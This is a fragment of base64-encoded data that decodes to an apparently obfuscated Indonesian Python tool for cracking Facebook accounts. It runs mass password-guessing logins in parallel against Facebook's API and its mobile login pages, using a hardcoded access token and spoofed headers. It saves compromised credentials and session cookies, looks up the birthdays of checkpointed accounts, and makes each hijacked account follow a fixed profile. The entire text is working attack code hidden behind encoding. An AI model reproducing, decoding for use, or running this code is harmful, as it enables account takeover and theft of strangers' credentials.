AgICBwcmludCgnXG4gJXNbJXMhJXNdIGd1bmFrYW4gLCAoa29tYSkgdW50dWsgcGVtaXNhaCBjb250b2ggOiBzYW5kaTEyMyxzYW5kaTEyMzQ1LGRsbC4gc2V0aWFwIGthdGEgbWluaW1hbCA2IGthcmFrdGVyIGF0YXUgbGViaWgnJShOLE0sTikpDQogICAgICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgICAgIHB3ZWsgPSBpbnB1dCgnXG4gWyVzPyVzXSBtYXN1a2FuIGthdGEgc2FuZGkgOiAnJShPLE4pKQ0KICAgICAgICAgICAgICAgIHByaW50KCcgWypdIGNyYWNrIGRlbmdhbiBzYW5kaSAtPiBbICVzJXMlcyBdJyAlIChNLCBwd2VrLCBOKSkNCiAgICAgICAgICAgICAgICBpZiBwd2VrID09ICcnOg0KICAgICAgICAgICAgICAgICAgICBwcmludCgnXG4gJXNbJXPDlyVzXSBqYW5nYW4ga29zb25nIGJybyBrYXRhIHNhbmRpIG55YSclKE4sTSxOKSkNCiAgICAgICAgICAgICAgICBlbGlmIGxlbihwd2VrKTw9NToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xuICVzWyVzw5clc10ga2F0YSBzYW5kaSBtaW5pbWFsIDYga2FyYWt0ZXInJShOLE0sTikpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgZGVmIF9feWFuX18oeXNjPU5vbmUpOiAjIHljcyA9PiBZYXlhbiBzYXlhbmcgQ2luZHk6Mw0KICAgICAgICAgICAgICAgICAgICAgICAgY2luID0gaW5wdXQoJ1xuIFsqXSBtZXRob2QgOiAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2luID09ICcnOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCdcbiAlc1slc8OXJXNdIGphbmdhbiBrb3NvbmcgYnJvJyUoTixNLE4pKTtfX3lhbl9fKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgY2luID09ICcxJzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnXG4gWyVzKyVzXSBoYXNpbCBPSyBkaXNpbXBhbiBrZSAtPiByZXN1bHRzL09LLSVzLSVzLSVzLnR4dCclKE8sTixoYSwgb3AsIHRhKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnIFslcyslc10gaGFzaWwgQ1AgZGlzaW1wYW4ga2UgLT4gcmVzdWx0cy9DUC0lcy0lcy0lcy50eHQnJShPLE4saGEsIG9wLCB0YSkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xuIFslcyElc10gYW5kYSBiaXNhIG1lbWF0aWthbiBkYXRhIHNlbHVsYXIgdW50dWsgbWVuamVkYSBwcm9zZXMgY3JhY2tcbiclKE0sTikpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBZYXlhbkdhbnRlbmcobWF4X3dvcmtlcnM9MzApIGFzIChfX3lheWFuWERfXyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpa2VoIGluIHNlbGYuaWQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAg""ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga2ltb2NoaSA9IGlrZWguc3BsaXQoJzw9PicpWzBdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX195YXlhblhEX18uc3VibWl0KHNlbGYuX19hcGlfXywga2ltb2NoaSwgeXNjKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoYXNpbChvayxjcCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgY2luID09ICcyJzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnXG4gWyVzKyVzXSBoYXNpbCBPSyBkaXNpbXBhbiBrZSAtPiByZXN1bHRzL09LLSVzLSVzLSVzLnR4dCclKE8sTixoYSwgb3AsIHRhKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnIFslcyslc10gaGFzaWwgQ1AgZGlzaW1wYW4ga2UgLT4gcmVzdWx0cy9DUC0lcy0lcy0lcy50eHQnJShPLE4saGEsIG9wLCB0YSkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xuIFslcyElc10gYW5kYSBiaXNhIG1lbWF0aWthbiBkYXRhIHNlbHVsYXIgdW50dWsgbWVuamVkYSBwcm9zZXMgY3JhY2tcbiclKE0sTikpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBZYXlhbkdhbnRlbmcobWF4X3dvcmtlcnM9MzApIGFzIChfX3lheWFuWERfXyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpa2VoIGluIHNlbGYuaWQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga2ltb2NoaSA9IGlrZWguc3BsaXQoJzw9PicpWzBdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX195YXlhblhEX18uc3VibWl0KHNlbGYuX19tZXRvZGVfXywga2ltb2NoaSwgeXNjLCAibWJhc2ljLmZhY2Vib29rLmNvbSIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhhc2lsKG9rLGNwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBjaW4gPT0gJzMnOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCdcbiBbJXMrJXNdIGhhc2lsIE9LIGRpc2ltcGFuIGtlIC0+IHJlc3VsdHMvT0stJXMtJXMtJXMudHh0JyUoTyxOLGhhLCBvcCwgdGEpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCcgWyVzKyVzXSBoYXNpbCBDUCBkaXNpbXBhbiBrZSAtPiByZXN1bHRzL0NQLSVzLSVzLSVzLnR4dCclKE8sTixoYSwgb3AsIHRhKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnXG4gWyVzISVzXSBhbmRhIGJpc2EgbWVtYXRpa2FuIGRhdGEgc2VsdWxhciB1bnR1ayBtZW5qZWRhIHByb3NlcyBjcmFja1xuJyUoTSxOKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3""aXRoIFlheWFuR2FudGVuZyhtYXhfd29ya2Vycz0zMCkgYXMgKF9feWF5YW5YRF9fKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGlrZWggaW4gc2VsZi5pZDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBraW1vY2hpID0gaWtlaC5zcGxpdCgnPD0+JylbMF0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX3lheWFuWERfXy5zdWJtaXQoc2VsZi5fX21ldG9kZV9fLCBraW1vY2hpLCB5c2MsICJtLmZhY2Vib29rLmNvbSIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhhc2lsKG9rLGNwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnXG4gJXNbJXPDlyVzXSBpbnB1dCB5YW5nIGJlbmVyJyUoTyxILE8pKTtfX3lhbl9fKCkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xuIFsgcGlsaWggbWV0aG9kIGxvZ2luIC0gc2lsYWhrYW4gY29iYSBzYXR1wrIgXVxuJykNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJyBbJXMxJXNdLiBNRVRIT0QgTUJBU0lDIChTTE9XKSclKFUsUCkpDQogICAgICAgICAgICAgICAgICAgIHByaW50KCcgWyVzMiVzXS4gTUVUSE9EIE1PQklMRSAoRkFTVCknJShPLE4pKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCgnIFslczMlc10uIE1FVEhPRCBBUEkgKEZBU1RFUikgW1wwMzNbOTJtUkVDT01NRU5ERURcMDMzWzBtXSclKFUsUCkpDQogICAgICAgICAgICAgICAgICAgIF9feWFuX18ocHdlay5zcGxpdCgnLCcpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICBlbGlmIF9fX3lheWFuZ2FudGVuZ19fXyBpbiAoJ1QnLCAndCcpOg0KICAgICAgICAgICAgcHJpbnQoJ1xuIFsgcGlsaWggbWV0aG9kIGxvZ2luIC0gc2lsYWhrYW4gY29iYSBzYXR1wrIgXVxuJykNCiAgICAgICAgICAgIHByaW50KCcgWyVzMSVzXS4gTUVUSE9EIE1CQVNJQyAoU0xPVyknJShPLE4pKQ0KICAgICAgICAgICAgcHJpbnQoJyBbJXMyJXNdLiBNRVRIT0QgTU9CSUxFIChGQVNUKSclKFUsUCkpDQogICAgICAgICAgICBwcmludCgnIFslczMlc10uIE1FVEhPRCBBUEkgKEZBU1RFUikgW1wwMzNbOTJtUkVDT01NRU5ERURcMDMzWzBtXSclKE8sTikpDQogICAgICAgICAgICBzZWxmLl9fcGxlcl9fKCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KCdcbiAlc1slc8OXJXNdIHkvdCBnb2Jsb2shJyUoTixNLE4pKTtzZWxmLnBsZXJyKGlkKQ0KDQogICAgZGVmIF9fYXBpX18oc2VsZiwgdXNlciwgX195YW5fXyk6DQogICAgICAgIGdsb2JhbCBvayxjcCxsb29wDQogICAgICAgIGZvciBpIGluIGxpc3QoJ1x8LS8nKToNCiAgICAgICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidcciBb""Kl0gW2NyYWNrXSB7bG9vcH0ve2xlbihzZWxmLmlkKX0gLT5LQVJNQS1PSy06e2xlbihvayl9IC0gQ1AtOntsZW4ob2spfSAnKSwNCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICBmb3IgcHcgaW4gX195YW5fXzoNCiAgICAgICAgICAgIHB3ID0gcHcubG93ZXIoKQ0KICAgICAgICAgICAgdHJ5OiBvcy5ta2RpcigncmVzdWx0cycpDQogICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgIHAgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iK3VzZXIrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IitwdysiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikuanNvbigpDQogICAgICAgICAgICBpZiAiYWNjZXNzX3Rva2VuIiBpbiBwOg0KICAgICAgICAgICAgICAgIHByaW50KCdcciAgJXMqIFtLQVJNQS1DUF0gJXN8JXN8JXMgICAgICAgICAgICAgICAgICVzJyAlIChILHVzZXIscHcsTikpDQogICAgICAgICAgICAgICAgd3J0ID0gJyBb4pyTXSAlc3wlcycgJSAodXNlcixwdykNCiAgICAgICAgICAgICAgICBvay5hcHBlbmQod3J0KQ0KICAgICAgICAgICAgICAgIG9wZW4oJ3Jlc3VsdHMvT0stJXMtJXMtJXMudHh0JyAlIChoYSwgb3AsIHRhKSwgJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsaWYgInd3dy5mYWNlYm9vay5jb20iIGluIHBbImVycm9yX21zZyJdOg0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAga29udG9sID0gb3BlbignLnRva2VuLnR4dCcpLnJlYWQoKQ0KICAgICAgICAgICAgICAgICAgICBjcF90dGwgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2ZpZWxkcz1iaXJ0aGRheSZhY2Nlc3NfdG9rZW49JXMnJSh1c2VyLGtvbnRvbCkpLmpzb24oKVsnYmlydGhkYXknXQ0KICAgICAgICAgICAgICAgICAgICBtb250aCwgZGF5LCB5ZWFyID0gY3BfdHRsLnNwbGl0KCcvJykNCiAgICAgICAgICAgICAgICAgICAgbW9udGggPSBidWxhbl90dGxbbW9udGhdDQogICAgICAgICAgICAgICAgICAgIHByaW50KCdcciAgJXMqW0tBUk1BXSAlc3wlc3wlcyAlcyAlcyAgICAgJXMnICUgKEssdXNlcixwdyxkYXksbW9udGgseWVhcixOKSkNCiAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyBbw5ddICVzfCVzfCVzICVzICVzJyAlICh1c2VyLHB3LGRheSxtb250aCx5ZWFyKQ0KICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQod3J0KQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCdyZXN1bHRzL0NQLSVzLSVzLSVzLnR4dCcgJSAoaGEsIG9wLCB0YSks""ICdhJykud3JpdGUoJyVzXG4nICUgd3J0KQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KICAgICAgICAgICAgICAgICAgICBtb250aCA9ICcnDQogICAgICAgICAgICAgICAgICAgIGRheSAgID0gJycNCiAgICAgICAgICAgICAgICAgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgIHByaW50KCdcciAgJXMqIFtLQVJNQS1DUF0gJXN8JXMgICAgICAgICAgICAgICAgJXMnICUgKEssdXNlcixwdyxOKSkNCiAgICAgICAgICAgICAgICB3cnQgPSAnIFvDl10gJXN8JXMnICUgKHVzZXIscHcpDQogICAgICAgICAgICAgICAgY3AuYXBwZW5kKHdydCkNCiAgICAgICAgICAgICAgICBvcGVuKCdyZXN1bHRzL0NQLSVzLSVzLSVzLnR4dCcgJSAoaGEsIG9wLCB0YSksICdhJykud3JpdGUoJyVzXG4nICUgd3J0KQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGxvb3AgKz0gMQ0KDQogICAgZGVmIF9fbWV0b2RlX18oc2VsZiwgdXNlciwgX195YW5fXywgY2Vib2spOg0KICAgICAgICBnbG9iYWwgb2ssY3AsbG9vcA0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYnXHIgWypdIFtjcmFja10ge2xvb3B9L3tsZW4oc2VsZi5pZCl9IC0+S0FSTUEtT0stOntsZW4ob2spfSAtIENQLTp7bGVuKGNwKX0gJyksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBmb3IgcHcgaW4gX195YW5fXzoNCiAgICAgICAgICAgICAgICBwdyA9IHB3Lmxvd2VyKCkNCiAgICAgICAgICAgICAgICBzZXNzaW9uPXJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAgICAgICAgIGhlYWRlciA9IHsNCiAgICAgICAgICAgICAgICAgICAgIkhvc3QiOmNlYm9rLA0KICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLA0KICAgICAgICAgICAgICAgICAgICAidXNlci1hZ2VudCI6Ik5va2lhQzMtMDAvNS4wICgwOC42MykgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLA0KICAgICAgICAgICAgICAgICAgICAiZG50IjoiMSIsDQogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoibWFyay52aWEuZ3AiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXNpdGUiOiJzYW1l""LW9yaWdpbiIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ImRvY3VtZW50IiwNCiAgICAgICAgICAgICAgICAgICAgInJlZmVyZXIiOiJodHRwczovL20uZmFjZWJvb2suY29tLyIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIGJyIiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44Ig0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByID0gc2Vzc2lvbi5nZXQoZiJodHRwczovL3tjZWJva30vaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsIGhlYWRlcnM9aGVhZGVyKQ0KICAgICAgICAgICAgICAgIGRhcyA9IHsNCiAgICAgICAgICAgICAgICAgICAgImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksDQogICAgICAgICAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksDQogICAgICAgICAgICAgICAgICAgICJ1aWQiOnVzZXIsDQogICAgICAgICAgICAgICAgICAgICJmbG93IjoibG9naW5fbm9fcGluIiwNCiAgICAgICAgICAgICAgICAgICAgInBhc3MiOnB3LA0KICAgICAgICAgICAgICAgICAgICAibmV4dCI6Imh0dHBzOi8vZGV2ZWxvcGVycy5mYWNlYm9vay5jb20vdG9vbHMvZGVidWcvYWNjZXNzdG9rZW4vIg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBoZWFkZXIxID0gew0KICAgICAgICAgICAgICAgICAgICAiSG9zdCI6Y2Vib2ssDQogICAgICAgICAgICAgICAgICAgICJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwNCiAgICAgICAgICAgICAgICAgICAgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwNCiAgICAgICAgICAgICAgICAgICAgIm9yaWdpbiI6Imh0dHBzOi8vIitjZWJvaywNCiAgICAgICAgICAgICAgICAgICAgImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsDQogICAgICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBTQU1TVU5HIFNNLUc3ODBHKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYW1zdW5nQnJvd3Nlci8xNi4wIENocm9tZS85Mi4wLjQ1MTUuMTY2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGlt""YWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsDQogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoiWE1MSHR0cFJlcXVlc3QiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ImRvY3VtZW50IiwNCiAgICAgICAgICAgICAgICAgICAgInJlZmVyZXIiOiJodHRwczovLyIrY2Vib2srIi9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjoiZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjgiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHBvID0gc2Vzc2lvbi5wb3N0KGYiaHR0cHM6Ly97Y2Vib2t9L2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wIiwgZGF0YSA9IGRhcywgaGVhZGVycyA9IGhlYWRlcjEsIGFsbG93X3JlZGlyZWN0cyA9IEZhbHNlKQ0KICAgICAgICAgICAgICAgIGlmICdjX3VzZXInIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAgICAgICAgICAgICBjb2tpPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgICAgIHByaW50KGYnXHIgIHtIfSpbS0FSTUEtT0tdIHt1c2VyfXx7cHd9fHtjb2tpfXtOfScpDQogICAgICAgICAgICAgICAgICAgIHdydCA9ICcgW+Kck10gJXN8JXN8JXMnICUgKHVzZXIscHcsY29raSkNCiAgICAgICAgICAgICAgICAgICAgb2suYXBwZW5kKHdydCkNCiAgICAgICAgICAgICAgICAgICAgb3BlbigncmVzdWx0cy9PSy0lcy0lcy0lcy50eHQnICUgKGhhLCBvcCwgdGEpLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5mb2xsb3coc2Vzc2lvbixjb2tpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnogPSBvcGVuKCcudG9rZW4udHh0JykucmVhZCgpDQogICAgICAgICAgICAgICAgICAgICAgICBjcF90dGwgPSBzZXNzaW9uLmdldChmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2su""Y29tL3t1c2VyfT9maWVsZHM9YmlydGhkYXkmYWNjZXNzX3Rva2VuPXt0b2tlbnp9JykuanNvbigpWydiaXJ0aGRheSddDQogICAgICAgICAgICAgICAgICAgICAgICBtb250aCwgZGF5LCB5ZWFyID0gY3BfdHRsLnNwbGl0KCcvJykNCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gYnVsYW5fdHRsW21vbnRoXQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xyICAlcyogW0tBUk1BLUNQXSAlc3wlc3wlcyAlcyAlcyAgICAgJXMnICUgKEssdXNlcixwdyxkYXksbW9udGgseWVhcixOKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHdydCA9ICcgW8OXXSAlc3wlc3wlcyAlcyAlcycgJSAodXNlcixwdyxkYXksbW9udGgseWVhcikNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwLmFwcGVuZCh3cnQpDQogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCdyZXN1bHRzL0NQLSVzLSVzLSVzLnR4dCcgJSAoaGEsIG9wLCB0YSksICdhJykud3JpdGUoJyVzXG4nICUgd3J0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQogICAgICAgICAgICAgICAgICAgICAgICBtb250aCA9ICcnDQogICAgICAgICAgICAgICAgICAgICAgICBkYXkgICA9ICcnDQogICAgICAgICAgICAgICAgICAgICAgICB5ZWFyICA9ICcnDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgICAgICAgICAgICAgIHByaW50KCdcciAgJXMqW0tBUk1BLUNQXSAlc3wlcyAgICAgICAgICAgICAgICAlcycgJSAoSyx1c2VyLHB3LE4pKQ0KICAgICAgICAgICAgICAgICAgICB3cnQgPSAnIFvDl10gJXN8JXMnICUgKHVzZXIscHcpDQogICAgICAgICAgICAgICAgICAgIGNwLmFwcGVuZCh3cnQpDQogICAgICAgICAgICAgICAgICAgIG9wZW4oJ3Jlc3VsdHMvQ1AtJXMtJXMtJXMudHh0JyAlIChoYSwgb3AsIHRhKSwgJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCg0KICAgICAgICAgICAgbG9vcCs9MQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBzZWxmLl9fbWV0b2RlX18odXNlciwgcHcsIGNlYm9rKQ0KIyAgICA8LSBCb3QgZm9sbG93ZXJzIC0+DQogICAgZGVmIGZvbGxvdyhzZWxmLHNlc3Npb24sY29raSk6DQogICAgICAgIHIgPSBCZWF1dGlmdWxTb3VwKHNlc3Npb24uZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9NTUzNTAzMjE4Iixjb29raWVzPXsiY29va2llIjpjb2tpfSkudGV4dCwiaHRtbC5wYXJzZXIiKQ0KICAgICAgICBnZXQgPSByLmZpbmQoImEiLHN0cmluZz0iSWt1dGkiKS5nZXQoImhyZWYiKQ0KICAgICAgICBzZXNzaW9uLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIitzdHIoZ2V0KSxjb29raWVzPXsiY29va2llIjpjb2tp""fSkudGV4dA0KDQogICAgZGVmIF9fcGxlcl9fKHNlbGYpOg0KICAgICAgICB5YW4gPSBpbnB1dCgnXG4gWypdIG1ldGhvZCA6ICcpDQogICAgICAgIGlmIHlhbiA9PSAnJzoNCiAgICAgICAgICAgIHByaW50KCdcbiAlc1slc8OXJXNdIGphbmdhbiBrb3NvbmcgYnJvJyUoTyxILE8pKTtzZWxmLl9fcGxlcl9fKCkNCiAgICAgICAgZWxpZiB5YW4gaW4gKCcxJywgJzAxJyk6DQogICAgICAgICAgICBwcmludCgnXG4gWyVzKyVzXSBoYXNpbCBPSyBkaXNpbXBhbiBrZSAtPiByZXN1bHRzL09LLSVzLSVzLSVzLnR4dCclKE8sSCxoYSwgb3AsIHRhKSkNCiAgICAgICAgICAgIHByaW50KCcgWyVzKyVzXSBoYXNpbCBDUCBkaXNpbXBhbiBrZSAtPiByZXN1bHRzL0NQLSVzLSVzLSVzLnR4dCclKE8sSCxoYSwgb3AsIHRhKSkNCiAgICAgICAgICAgIHByaW50KCdcbiBbJXMhJXNdIGFuZGEgYmlzYSBtZW1hdGlrYW4gZGF0YSBzZWx1bGFyIHVudHVrIG1lbmplZGEgcHJvc2VzIGNyYWNrXG4nJShPLEgpKQ0KICAgICAgICAgICAgd2l0aCBZYXlhbkdhbnRlbmcobWF4X3dvcmtlcnM9MzApIGFzIGtpcmltOg0KICAgICAgICAgICAgICAgIGZvciB5bnRrdHMgaW4gc2VsZi5pZDogIyBZbyBOZGFrIFRhdSBLb2sgVGFueWEgU2FpYQ0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB1aWQsIG5hbWUgPSB5bnRrdHMuc3BsaXQoJzw9PicpDQogICAgICAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQ0KICAgICAgICAgICAgICAgICAg